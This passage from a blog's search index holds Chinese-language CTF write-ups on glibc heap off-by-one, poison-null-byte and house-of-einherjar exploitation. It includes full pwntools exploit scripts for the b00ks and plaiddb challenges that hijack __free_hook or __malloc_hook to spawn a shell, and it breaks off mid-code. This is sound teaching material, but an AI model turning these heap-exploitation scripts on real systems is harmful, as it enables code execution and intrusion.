<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2023/05/29/CTF_off-By-One/"/>
      <url>/2023/05/29/CTF_off-By-One/</url>
      
        <content type="html"><![CDATA[<h1 id="堆中的Off-By-One"><a href="#堆中的Off-By-One" class="headerlink" title="堆中的Off-By-One"></a>堆中的Off-By-One</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括</p><ul><li>使用循环语句向堆块中写入数据时，循环的次数设置错误导致多写入了一个字节。</li><li>字符串操作不合适</li></ul><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li><p>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</p></li><li><p>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 prev_in_use 位被清，这样前块会被认为是 free 块。</p><p> （1） 这时可以选择使用 unlink 方法进行处理。</p><p>  （2） 另外，这时 prev_size 域就会启用，就可以伪造 prev_size ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 prev_size 找到的块的大小与prev_size 是否一致。</p></li></ol><pre><code>chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Size of previous chunk, if unallocated (P clear)  |        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Size of chunk, in bytes                     |A|M|P|  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             User data starts here...                          .        .                                                               .        .             (malloc_usable_size() bytes)                      .next    .                                                               |chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             (size of chunk, but used for application data)    |        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Size of next chunk, in bytes                |A|0|1|        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</code></pre><ul><li><em>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1表示不属于，0表示属于。</em></li><li><em>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</em></li><li><em>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的P位都会被设置为1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲chunk之间的合并</em></li></ul><p>&#x3D;&#x3D;最新版本代码中，已加入针对 2 中后一种方法的 check ，但是在 2.28 及之前版本并没有该 check 。&#x3D;&#x3D;</p><pre><code class="c_cpp">/* consolidate backward */    if (!prev_inuse(p)) &#123;      prevsize = prev_size (p);      size += prevsize;      p = chunk_at_offset(p, -((long) prevsize));      /* 后两行代码在最新版本中加入，则 2 的第二种方法无法使用，但是 2.28 及之前都没有问题 */      if (__glibc_unlikely (chunksize(p) != prevsize))        malloc_printerr (&quot;corrupted size vs. prev_size while consolidating&quot;);      unlink_chunk (av, p);    &#125;</code></pre><h3 id="思路示例1"><a href="#思路示例1" class="headerlink" title="思路示例1"></a>思路示例1</h3><p><strong>可以溢出任意字节</strong></p><ol><li><p>存在物理地址相连的四个chunk块a、b、c、d，chunk a存在off-by-one溢出时，我们可以将chunk b的size大小更改为chunk b的size加上chunk c的大小。</p></li><li><p><strong>free b</strong>时，chunk c的空间也会被一并归到chunk b的free chunk。</p></li><li><p>之后我们malloc一个合并起来size大小的chunk e，即**malloc(0x180-8)**，会发现我们对chunk e操作时，可以对overlap的chunk c进行操作，我们并未free c，所以我们可以随意更改原本不能操作的heap header</p><img src="a359f0db2041768803ce13c694adf04f.png" alt="截图" style="zoom:50%;" /><hr><pre><code>    ==这里有一个疑问，单字节溢出应该只溢出一个字节，为什么连prev_size都能覆盖，似乎溢出的是0x9个字节，而且malloc为什么不是0x180，还减去0x8？==</code></pre><p><strong>这就是 ptmalloc 中 chunk 间的复用</strong></p><p>当两个相邻的chunk在一起时，如果前一个chunk处于使用状态，那么后一个chunk的prev_size成员就不使用了，这些看上去似乎是一种浪费。因此，系统做了如下的规定：</p></li></ol><p>当前一个chunk申请的数据空间申请的大小对16取余后，如果多出来的大小小于等于8字节，那么这个多出来的大小就放入下一个chunk的prev_size中存储。</p><hr><h3 id="思路示例2"><a href="#思路示例2" class="headerlink" title="思路示例2"></a>思路示例2</h3><p><strong>只能溢出0字节</strong>(<em>poison null byte</em>)</p><ol><li>存在物理地址相连的四个chunk块a、b、c、d，a存在溢出漏洞，b为被溢出chunk，<strong>free b</strong></li><li>进行溢出，覆盖掉size最低字节为0，size从0x111-&gt;0x100，chunk被缩小，但next chunk c的prev_size仍为0x110——漏洞点</li></ol><p><img src="https://fastly.jsdelivr.net/gh/DETALA/images@main/pwn/malloc&free/1685350457687d88c93d9d196a2b9485019cffe3a70c1.png"></p><p>此时如果我们直接malloc(0x80)，会出现报错”corrupted size vs. prev_size”，这是因为unlink中加入了下述检查。</p><pre><code class="c_cpp">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \      malloc_printerr (&quot;corrupted size vs. prev_size&quot;);    </code></pre><p>所以我们要在free b前布置一个fake chunk c，设置其<strong>prev_size &#x3D; 0x100</strong>,与溢出后的chun b大小一致。</p><hr><p>&#x3D;&#x3D;    但是这里malloc(0x80)为什么会触发unlink？这里实现的操作应该是从unsorted bins上切割下0x90的大小给b1，且malloc中能够触发unlink的情况只能在malloc_consolidate，这里没有fastbins明显不能触发，很疑惑。&#x3D;&#x3D;</p><hr><ol start="3"><li>malloc b1、b2，<strong>malloc(0x80);malloc(0x40)</strong>,malloc函数会从unsorted bins即chun b切割下0x90大小给b1，并设置reminder的状态以及其next chunk(fake chunk c)的prev_size为0x100-0x90 &#x3D; 0x70，b2同理，最终形成如下图第一列的结构，其中fake prev_size &#x3D; 0x20。</li><li><strong>free(b1);free(c)</strong>,在free c时，根据c的prev_size为0x110进行chunk查找到了b1，发现其为free状态，出发unlink操作，最终得到了一块实际大小为0x1a0的unsorted bin，</li><li><strong>malloc(0x190)</strong>,我们就获取这一整块0x190大小的控制权，其中包括了还未释放的b2。</li></ol><p><img src="https://fastly.jsdelivr.net/gh/DETALA/images@main/pwn/malloc&free/16853504798668fdebb6b470db2433601a3fde1e7fc79.png"></p><h2 id="实例-1-Asis-CTF-2016-b00ks"><a href="#实例-1-Asis-CTF-2016-b00ks" class="headerlink" title="实例 1: Asis CTF 2016 b00ks"></a>实例 1: Asis CTF 2016 b00ks</h2><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>题目是一个常见的选单式程序，功能是一个图书管理系统。</p><pre><code>1. Create a book2. Delete a book3. Edit a book4. Print book detail5. Change current author name6. Exit</code></pre><p>程序每创建一个 book 会分配 0x20 字节的结构来维护它的信息</p><pre><code class="c_cpp">struct book&#123;    int id;    char *name;    char *description;    int size;&#125;struct book *book[20];</code></pre><h4 id="Create"><a href="#Create" class="headerlink" title="Create"></a>Create</h4><p>book 结构中存在 name 和 description， 在堆上分配。</p><p>首先分配 name buffer ，使用 malloc ，大小自定 。</p><pre><code class="c_cpp">printf(&quot;\nEnter book name size: &quot;, *(_QWORD *)&amp;size);__isoc99_scanf(&quot;%d&quot;, &amp;size);printf(&quot;Enter book name (Max 32 chars): &quot;, &amp;size);ptr = malloc(size);</code></pre><p>之后分配 description ，同样大小自定。</p><pre><code class="c_cpp">printf(&quot;\nEnter book description size: &quot;, *(_QWORD *)&amp;size);        __isoc99_scanf(&quot;%d&quot;, &amp;size);v5 = malloc(size);</code></pre><p>之后分配 book 结构的内存,固定大小0x20。</p><pre><code class="c_cpp">book = malloc(0x20uLL);if ( book )&#123;    *((_DWORD *)book + 6) = size;    *((_QWORD *)off_202010 + v2) = book;    *((_QWORD *)book + 2) = description;    *((_QWORD *)book + 1) = name;    *(_DWORD *)book = ++unk_202024;    return 0LL;&#125;</code></pre><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>程序编写的 read 函数存在 null byte off-by-one 漏洞，仔细观察这个 read 函数可以发现对于边界的考虑是不当的</p><pre><code class="c_cpp">signed __int64 __fastcall my_read(_BYTE *ptr, int number)&#123;  int i; // [rsp+14h] [rbp-Ch]  _BYTE *buf; // [rsp+18h] [rbp-8h]  if ( number &lt;= 0 )    return 0LL;  buf = ptr;  for ( i = 0; ; ++i )  &#123;    if ( (unsigned int)read(0, buf, 1uLL) != 1 )      return 1LL;    if ( *buf == &#39;\n&#39; )      break;    ++buf;    if ( i == number )      break;  &#125;  *buf = 0;  return 0LL;&#125;</code></pre><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="泄露堆指针"><a href="#泄露堆指针" class="headerlink" title="泄露堆指针"></a>泄露堆指针</h4><p>因为程序中的 my_read 函数存在 null byte off-by-one ，事实上 my_read 读入的结束符 ‘\x00’ 是写入到 0x555555756060 的位置的。这样当 0x555555756060～0x555555756068 写入 book 指针时就会覆盖掉结束符 ‘\x00’ ，所以这里是存在一个地址泄漏的漏洞。通过打印 author name 就可以获得 pointer array 中第一项的值。</p><p>通过ida和gdb的查看，我们发现author name后面紧接着的就是book[0]的地址，由此我们得到了book1_addr和book2_addr。</p><pre><code class="text">0x555555756040: 0x6161616161616161  0x61616161616161610x555555756050: 0x6161616161616161  0x6161616161616161   &lt;== author name0x555555756060: 0x0000555555757480 &lt;== pointer array    0x00000000000000000x555555756070: 0x0000000000000000  0x00000000000000000x555555756080: 0x0000000000000000  0x0000000000000000</code></pre><pre><code class="python">  def leak_heap():    global book2_addr    io.sendlineafter(&quot;name: &quot;, &quot;A&quot; * 0x20)    #on this moment,don&#39;t overlap books,which is not constructed    Create(0xd0, &quot;AAAA&quot;, 0x20, &quot;AAAA&quot;)          # book1    Create(0x21000, &quot;AAAA&quot;, 0x21000, &quot;AAAA&quot;)    # book2    Print()    io.recvuntil(&quot;A&quot;*0x20)    book1_addr = u64(io.recvn(6).ljust(8, b&quot;\x00&quot;))    book2_addr = book1_addr + 0x30    log.info(&quot;book2 address: 0x%x&quot; % book2_addr)</code></pre><p>再上述操作后，heap构造如下图所示，</p><p><img src="https://fastly.jsdelivr.net/gh/DETALA/images@main/pwn/malloc&free/168535054484078efc3a831c59fd7a803b1dcba6cba65.png"></p><h4 id="泄露libc-off-by-one"><a href="#泄露libc-off-by-one" class="headerlink" title="泄露libc(off-by-one)"></a>泄露libc(off-by-one)</h4><p>程序中同样提供了一种 change 功能， change 功能用于修改 author name ，所以通过 change 可以写入 author name ，利用 off-by-one 覆盖 pointer array 第一个项的低字节（book[0]的最低字节地址）。</p><p>覆盖掉 book1 指针的低字节后，这个指针会指向 book1 的 description ，由于程序提供了 edit 功能可以任意修改 description 中的内容。我们可以提前在 description 中布置数据伪造成一个 book 结构，这个 book 结构的 description 和 name 指针可以由直接控制。</p><pre><code class="python">def leak_libc():    global libc_base    fake_book = p64(1) + p64(book2_addr + 0x8) * 2 + p64(0x20)    Edit(1, fake_book)    Change(&quot;A&quot; * 0x20)    Print()    io.recvuntil(&quot;Name: &quot;)    leak_addr = u64(io.recvn(6).ljust(8, b&quot;\x00&quot;))    libc_base = leak_addr - 0x5ca010        # mmap_addr - libc_base    log.info(&quot;libc address: 0x%x&quot; % libc_base)</code></pre><hr><p>        这道题的巧妙之处在于在分配第二个 book 时，使用一个很大的尺寸，使得堆以 mmap 模式进行拓展。我们知道堆有两种拓展方式一种是 brk 会直接拓展原来的堆，另一种是 mmap 会单独映射一块内存。<strong>且 mmap 分配的内存与 libc 之前存在固定的偏移因此可以推算出 libc 的基地址</strong>。</p><pre><code class="text">Start              End                Offset             Perm Path0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/ 桌面 /123/1230x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/ 桌面 /123/1230x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/ 桌面 /123/1230x00007f6572703000 0x00007f65728c3000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so0x00007f65728c3000 0x00007f6572ac3000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so0x00007f6572ac3000 0x00007f6572ac7000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so0x00007f6572ac7000 0x00007f6572ac9000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so0x00007f6572ac9000 0x00007f6572acd000 0x0000000000000000 rw-0x00007f6572acd000 0x00007f6572af3000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so0x00007f6572cb4000 0x00007f6572cd9000 0x0000000000000000 rw- &lt;========= mmap0x00007f6572cf2000 0x00007f6572cf3000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so0x00007f6572cf3000 0x00007f6572cf4000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so0x00007f6572cf4000 0x00007f6572cf5000 0x0000000000000000 rw-0x00007fffec566000 0x00007fffec587000 0x0000000000000000 rw- [stack]0x00007fffec59c000 0x00007fffec59f000 0x0000000000000000 r-- [vvar]0x00007fffec59f000 0x00007fffec5a1000 0x0000000000000000 r-x [vdso]0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]</code></pre><hr><p><img src="https://fastly.jsdelivr.net/gh/DETALA/images@main/pwn/malloc&free/16853506230314c8602d8e412ca034a0bc20733b70693.png"></p><h4 id="覆写free-hook为OGG"><a href="#覆写free-hook为OGG" class="headerlink" title="覆写free_hook为OGG"></a>覆写free_hook为OGG</h4><pre><code>    此时我们已经将book[0]的指针指向了fake book，所以我们能通过修改book[0]的description来控制fake book中description指针指向的区域。所以我们之前将fake book的description指向book2+8的位置，这样我们就能修改book2的name和description的指针，例如修改为**free_hook**的位置，从而套娃继续修改book2的description，也就是free_hook为我们的one_gadget。</code></pre><pre><code class="python">def overwrite():    free_hook = libc.symbols[&#39;__free_hook&#39;] + libc_base    one_gadget = libc_base + 0x4527a    fake_book = p64(free_hook) * 2    Edit(1, fake_book)    fake_book = p64(one_gadget)    Edit(2, fake_book)</code></pre><p><img src="https://fastly.jsdelivr.net/gh/DETALA/images@main/pwn/malloc&free/16853506380337c880e328810e1a84b11ebaa7eb21279.png"></p><h4 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h4><pre><code class="python">#!/usr/bin/python#encoding:utf-8from pwn import *context.arch = &#39;amd64&#39;#context.log_level = &#39;debug&#39;fn = &#39;./b00ks&#39;elf = ELF(fn)libc = ELF(&#39;/home/datal/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#39;)debug = 0if debug:    io = remote(&#39;node4.buuoj.cn&#39;, 29198)else:    io = process(fn)def Create(nsize, name, dsize, desc):    io.sendlineafter(&quot;&gt; &quot;, &#39;1&#39;)    io.sendlineafter(&quot;name size: &quot;, str(nsize))    io.sendlineafter(&quot;name (Max 32 chars): &quot;, name)    io.sendlineafter(&quot;description size: &quot;, str(dsize))    io.sendlineafter(&quot;description: &quot;, desc)def Delete(idx):    io.sendlineafter(&quot;&gt; &quot;, &#39;2&#39;)    io.sendlineafter(&quot;delete: &quot;, str(idx))def Edit(idx, desc):    io.sendlineafter(&quot;&gt; &quot;, &#39;3&#39;)    io.sendlineafter(&quot;edit: &quot;, str(idx))    io.sendlineafter(&quot;description: &quot;, desc)def Print():    io.sendlineafter(&quot;&gt; &quot;, &#39;4&#39;)def Change(name):    io.sendlineafter(&quot;&gt; &quot;, &#39;5&#39;)    io.sendlineafter(&quot;name: &quot;, name)def leak_heap():    global book2_addr    io.sendlineafter(&quot;name: &quot;, &quot;A&quot; * 0x20)    #on this moment,don&#39;t overlap books,which is not constructed    Create(0xd0, &quot;AAAA&quot;, 0x20, &quot;AAAA&quot;)          # book1    Create(0x21000, &quot;AAAA&quot;, 0x21000, &quot;AAAA&quot;)    # book2    Print()    io.recvuntil(&quot;A&quot;*0x20)    book1_addr = u64(io.recvn(6).ljust(8, b&quot;\x00&quot;))    book2_addr = book1_addr + 0x30    log.info(&quot;book2 address: 0x%x&quot; % book2_addr)def leak_libc():    global libc_base    fake_book = p64(1) + p64(book2_addr + 0x8) * 2 + p64(0x20)    Edit(1, fake_book)    Change(&quot;A&quot; * 0x20)    Print()    io.recvuntil(&quot;Name: &quot;)    leak_addr = u64(io.recvn(6).ljust(8, b&quot;\x00&quot;))    libc_base = leak_addr - 0x5ca010        # mmap_addr - libc_base    log.info(&quot;libc address: 0x%x&quot; % libc_base)&#39;&#39;&#39;0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints:  rax == NULL0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints:  [rsp+0x30] == NULL0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints:  [rsp+0x50] == NULL0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints:  [rsp+0x70] == NULL&#39;&#39;&#39;def overwrite():    free_hook = libc.symbols[&#39;__free_hook&#39;] + libc_base    one_gadget = libc_base + 0x4527a    fake_book = p64(free_hook) * 2    Edit(1, fake_book)    fake_book = p64(one_gadget)    Edit(2, fake_book)def pwn():    Delete(2)    io.interactive()if __name__ == &quot;__main__&quot;:    leak_heap()    leak_libc()    overwrite()    pwn()</code></pre><h2 id="实例-2-plaidctf-2015-plaiddb"><a href="#实例-2-plaidctf-2015-plaiddb" class="headerlink" title="实例 2 : plaidctf 2015 plaiddb"></a>实例 2 : plaidctf 2015 plaiddb</h2><h3 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h3><p>关键数据结构</p><pre><code>struct Node &#123;    char *key;    long data_size;    char *data;    struct Node *left;    struct Node *right;    long dummy;    long dummy1;&#125;</code></pre><h4 id="getline读取"><a href="#getline读取" class="headerlink" title="getline读取"></a>getline读取</h4><pre><code>char *__fastcall getline(__int64 a1, __int64 a2)&#123;  char *v2; // r12  char *v3; // rbx  size_t v4; // r14  char v5; // al  char v6; // bp  signed __int64 v7; // r13  char *v8; // rax  v2 = (char *)malloc(8uLL); // 一开始使用 malloc(8) 进行分配  v3 = v2;  v4 = malloc_usable_size(v2); // 计算了可用大小，例如对于 malloc(8) 来说，这里应该为24  while ( 1 )  &#123;    v5 = _IO_getc(stdin);    v6 = v5;    if ( v5 == -1 )      bye();    if ( v5 == 10 )      break;    v7 = v3 - v2;    if ( v4 &lt;= v3 - v2 )    &#123;      v8 = (char *)realloc(v2, 2 * v4); // 大小不够是将可用大小乘二，进行 realloc      v2 = v8;      if ( !v8 )      &#123;        puts(&quot;FATAL: Out of memory&quot;);        exit(-1);      &#125;      v3 = &amp;v8[v7];      v4 = malloc_usable_size(v8);    &#125;    *v3++ = v6; // &lt;--- 漏洞所在，此时 v3 作为索引，指向了下一个位置，如果位置全部使用完毕则会指向下一个本应该不可写位置   &#125;  *v3 = 0; // &lt;--- 漏洞所在。 off by one （NULL 字节溢出）  return v2;&#125;</code></pre><h4 id="put"><a href="#put" class="headerlink" title="put"></a>put</h4><pre><code>__int64 __fastcall cmd_put()&#123;  __int64 v0; // rsi  Node *row; // rbx  unsigned __int64 sz; // rax  char *v3; // rax  __int64 v4; // rbp  __int64 result; // rax  __int64 v6; // [rsp+0h] [rbp-38h]  unsigned __int64 v7; // [rsp+18h] [rbp-20h]  v7 = __readfsqword(0x28u);  row = (Node *)malloc(0x38uLL);  if ( !row )  &#123;    puts(&quot;FATAL: Can&#39;t allocate a row&quot;);    exit(-1);  &#125;  puts(&quot;PROMPT: Enter row key:&quot;);  row-&gt;key = getline((__int64)&quot;PROMPT: Enter row key:&quot;, v0);  puts(&quot;PROMPT: Enter data size:&quot;);  gets_checked((char *)&amp;v6, 16LL);  sz = strtoul((const char *)&amp;v6, 0LL, 0);  row-&gt;data_size = sz;  v3 = (char *)malloc(sz);  row-&gt;data = v3;  if ( v3 )  &#123;    puts(&quot;PROMPT: Enter data:&quot;);    fread_checked(row-&gt;data, row-&gt;data_size);    v4 = insert_node(row);    if ( v4 )    &#123;      free(row-&gt;key);      free(*(void **)(v4 + 16));      *(_QWORD *)(v4 + 8) = row-&gt;data_size;      *(_QWORD *)(v4 + 16) = row-&gt;data;      free(row);      puts(&quot;INFO: Update successful.&quot;);    &#125;    else    &#123;      puts(&quot;INFO: Insert successful.&quot;);    &#125;    result = __readfsqword(0x28u) ^ v7;  &#125;  else  &#123;    puts(&quot;ERROR: Can&#39;t store that much data.&quot;);    free(row-&gt;key);    free(row);  &#125;  return result;&#125;</code></pre><p>分配过程：</p><ol><li>malloc(0x38) (结构体)</li><li>getline (malloc 和 realloc)</li><li>malloc(size) 可控大小</li><li>读入 size 字节内容</li></ol><h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><h4 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h4><p>这里创建了连续的大小为0x80,0x110,0x90,0x90。</p><p>首先进行off-by-one，这里利用chunk的空间复用，先申请0x80，free后再申请0x78大小的chunk，这样就可以利用next chunk的prev_size。</p><pre><code class="python">PUT(&quot;A&quot;, 0x71, &quot;A&quot;*0x70)    PUT(&quot;B&quot;, 0x101, &quot;B&quot;*0x100)    PUT(&quot;C&quot;, 0x81, &quot;C&quot;*0x80)    PUT(&quot;def&quot;, 0x81, &quot;d&quot;*0x80)    DEL(&quot;A&quot;)    DEL(&quot;B&quot;)    PUT(&quot;A&quot;*0x78, 0x11, &quot;A&quot;*0x10)        # posion null byte</code></pre><h4 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h4><pre><code class="python">from pwn import *io = remote(&#39;127.0.0.1&#39;, 10001)        # io = process(&quot;./datastore_223&quot;)libc = ELF(&#39;/usr/local/glibc-2.23/lib/libc-2.23.so&#39;)def PUT(key, size, data):    io.sendlineafter(&quot;command:&quot;, &quot;PUT&quot;)    io.sendlineafter(&quot;key&quot;, key)    io.sendlineafter(&quot;size&quot;, str(size))    io.sendlineafter(&quot;data&quot;, data)def GET(key):    io.sendlineafter(&quot;command:&quot;, &quot;GET&quot;)    io.sendlineafter(&quot;key&quot;, key)    io.recvuntil(&quot;bytes]:\n&quot;)    return io.recvline()def DEL(key):    io.sendlineafter(&quot;command:&quot;, &quot;DEL&quot;)    io.sendlineafter(&quot;key&quot;, key)for i in range(0, 10):    PUT(str(i), 0x38, str(i)*0x37)for i in range(0, 10):    DEL(str(i))def leak_libc():    global libc_base    PUT(&quot;A&quot;, 0x71, &quot;A&quot;*0x70)    PUT(&quot;B&quot;, 0x101, &quot;B&quot;*0x100)    PUT(&quot;C&quot;, 0x81, &quot;C&quot;*0x80)    PUT(&quot;def&quot;, 0x81, &quot;d&quot;*0x80)    DEL(&quot;A&quot;)    DEL(&quot;B&quot;)    PUT(&quot;A&quot;*0x78, 0x11, &quot;A&quot;*0x10)        # posion null byte    PUT(&quot;B1&quot;, 0x81, &quot;X&quot;*0x80)    PUT(&quot;B2&quot;, 0x41, &quot;Y&quot;*0x40)    DEL(&quot;B1&quot;)    DEL(&quot;C&quot;)                            # overlap chunkB2    PUT(&quot;B1&quot;, 0x81, &quot;X&quot;*0x80)    libc_base = u64(GET(&quot;B2&quot;)[:8]) - 0x39bb78    log.info(&quot;libc address: 0x%x&quot; % libc_base)def pwn():    one_gadget = libc_base + 0x3f44a    malloc_hook = libc.symbols[&#39;__malloc_hook&#39;] + libc_base    DEL(&quot;B1&quot;)    payload  = p64(0)*16 + p64(0) + p64(0x71)    payload += p64(0)*12 + p64(0) + p64(0x21)    PUT(&quot;B1&quot;, 0x191, payload.ljust(0x190, &quot;B&quot;))    DEL(&quot;B2&quot;)    DEL(&quot;B1&quot;)    payload = p64(0)*16 + p64(0) + p64(0x71) + p64(malloc_hook-0x23)    PUT(&quot;B1&quot;, 0x191, payload.ljust(0x190, &quot;B&quot;))    PUT(&quot;D&quot;, 0X61, &quot;D&quot;*0x60)    payload = p8(0)*0x13 + p64(one_gadget)    PUT(&quot;E&quot;, 0X61, payload.ljust(0x60, &quot;E&quot;))    io.sendline(&quot;GET&quot;)    io.interactive()if __name__ == &#39;__main__&#39;:    leak_libc()    pwn()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/05/29/CTF_house-of-einherjar/"/>
      <url>/2023/05/29/CTF_house-of-einherjar/</url>
      
        <content type="html"><![CDATA[<h1 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>house of einherjar 是一种堆利用技术，由 Hiroki Matsukuma 提出，该堆利用技术可以强制使得 malloc 返回一个几乎任意地址的 chunk 。其主要在于滥用 free 中的后向合并操作（合并低地址的chunk），从而使得尽可能避免碎片化。</p><p>此外，需要注意的是，在一些特殊大小的堆块中，off by one 不仅可以修改下一个堆块的 prev_size，还可以修改下一个堆块的 PREV_INUSE 比特位。</p><hr><p>在《CTF竞赛权威指南》中将该技术归类到了off-by-one中，但是在CTF wiki并没有归类到一起，我比较赞同wiki的分类。因为在这里只是利用了share chunk原理，将next chunk的prev_size覆盖，程序中有无溢出并无关系，相反，如果存在null byte溢出，更改了next chunk的size大小，甚至还会出现麻烦，所以如果你和我一样是看这本书学习的话，不要被书上的分类误导。</p><hr><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>主要利用两个点，一个是free的unlink，另外一个是chunk复用。</p><h3 id="后向合并操作"><a href="#后向合并操作" class="headerlink" title="后向合并操作"></a>后向合并操作</h3><p>free 函数中的后向合并核心操作如下：</p><pre><code class="c_cpp">  /* consolidate backward */  if (!prev_inuse(p)) &#123;      prevsize = prev_size(p);      size += prevsize;      p = chunk_at_offset(p, -((long) prevsize));      unlink(av, p, bck, fwd);  &#125;</code></pre><p>在free中规定的合并顺序是先向后（也就是向低地址，上一个chunk的位置），再向前（next chunk）。</p><h3 id="chunk复用"><a href="#chunk复用" class="headerlink" title="chunk复用"></a>chunk复用</h3><p>   当前一个chunk申请的数据空间申请的大小对16取余后，如果多出来的大小小于等于8字节，那么这个多出来的大小就放入下一个chunk的prev_size中存储。在上一篇的off-by-one也讲到了这点，不再赘述。</p><h3 id="具体利用"><a href="#具体利用" class="headerlink" title="具体利用"></a>具体利用</h3><p>如下图所示，存在prev和p两个chunk，其中红框内的（prev_size）属于共享字段，所以我们填充prev的数据时可以覆盖掉p的prev_size字段，而向后合并时，寻找上一个chunk便需要通过本chunk的地址减去prev_size，也就是新chunk的地址取决于<code>chunk_at_offset(p, -((long)  prevsize))</code>。</p><p><img src="https://fastly.jsdelivr.net/gh/DETALA/images@main/pwn/malloc&free/16853500777080ae907ddcecfc4cb714c653555c36424.png"></p><p>此外，也要考虑一下unlink的检查机制，通过prev_size寻找的fake chunk需要设置相同大小的size，否则就会报错**”corrupted size vs. prev_size”**。</p><pre><code class="c_cpp">if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))            malloc_printerr (&quot;corrupted size vs. prev_size&quot;);</code></pre><p>我们的目的是造成overlap，以获取某块地址的控制权，那么这里fake chunk地址的选取就很关键了，这里介绍一种题目常用的方式，在stack中构造fake chunk，如下图所示。</p><p><img src="https://fastly.jsdelivr.net/gh/DETALA/images@main/pwn/malloc&free/1685350117704f9c0aa40636c72513fc03c823ea2a4a6.png"></p><p>可以看到我们在stack上构造了一个大小为size为0xffff800000604550的fake chunk，chunk b的prev_size也被覆盖了同样的大小，该大小是通过<code>chunk b_addr-prev_size =fake chunk_addr</code> 计算得来，在该例中，<strong>0x602020-0x7fffffffdad0 &#x3D; 0xffff800000604550</strong>。</p><p>在该过程中，chunk b向后合并，与fake chunk合并后，再向下合并，与top chunk相邻近，所以，fake chunk就变成了新的top chunk，在堆中不存在其他空闲chunk时，只要通过brk方式产生新heap，那么肯定是从fake chunk的地方分配，这意味着我们获得了从fake chunk地址+0x10开始之后一定空间的控制权（不大于brk方式的最大值）。</p><h2 id="2016-Seccon-tinypad"><a href="#2016-Seccon-tinypad" class="headerlink" title="2016 Seccon tinypad"></a>2016 Seccon tinypad</h2><h3 id="基本功能分析"><a href="#基本功能分析" class="headerlink" title="基本功能分析"></a>基本功能分析</h3><p>首先，程序有一个核心的读取函数，即读取指定长度字节的字符串，然而，当读取的长度恰好为指定的长度时，会出现<strong>off by one</strong> 的漏洞。</p><pre><code class="c_cpp">unsigned __int64 __fastcall read_until(char *a1, unsigned __int64 len, int terminate)&#123;  unsigned __int64 i; // [rsp+28h] [rbp-18h]  __int64 n; // [rsp+30h] [rbp-10h]  for ( i = 0LL; i &lt; len; ++i )  &#123;    n = read_n(0, (__int64)&amp;a1[i], 1uLL);    if ( n &lt; 0 )      return -1LL;    if ( !n || a1[i] == terminate )      break;  &#125;  a1[i] = 0;  //bull byte off-by-one  if ( i == len &amp;&amp; 